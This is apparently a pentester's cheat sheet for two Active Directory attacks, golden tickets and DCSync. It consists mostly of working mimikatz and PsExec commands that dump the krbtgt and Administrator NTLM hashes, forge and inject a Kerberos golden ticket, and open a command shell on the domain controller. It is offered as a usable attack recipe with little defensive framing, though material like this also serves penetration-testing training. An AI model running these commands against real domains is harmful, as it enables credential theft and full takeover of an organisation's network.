## Golden Tickets

If we have access to the DC with privilege rights we can grab the krbtgt password hash in order to create our own self-made custom TGTs, or golden tickets.

**Step 1:** Substract krbtgt's NTLM hash:

```bash
privilege::debug

lsadump::lsa /patch
```

**Step 2:** In the client machine, create a golden TGT ticket, inject it (/ptt) and open a cmd:

```bash
kerberos::golden /user:fakeuser /domain:$DOMAINNAME /sid:$SID /krbtgt:$KRBTGTHASH /ptt

misc::cmd
```

**Step 3:** Access the DC though PsExec:

```bash
PsExec.exe \\$DCHOSTNAME cmd.exe
```

## DC Synchronization

Since there could be more than 1 DC in order to achieve redundancy, if we have access to a member of the Domain Admins group (without logging in to the DC) we can use the following technique in order to perform a replication from a specific object.

###Â Replicate built-in AD Administrator account

```bash
mimikatz.exe

lsadump::dcsync /user:Administrator
#The output will show the NTLM hash of the Administrator account
```

**Note:** We can request a replication update to obtain the password hashes of every account in AD.
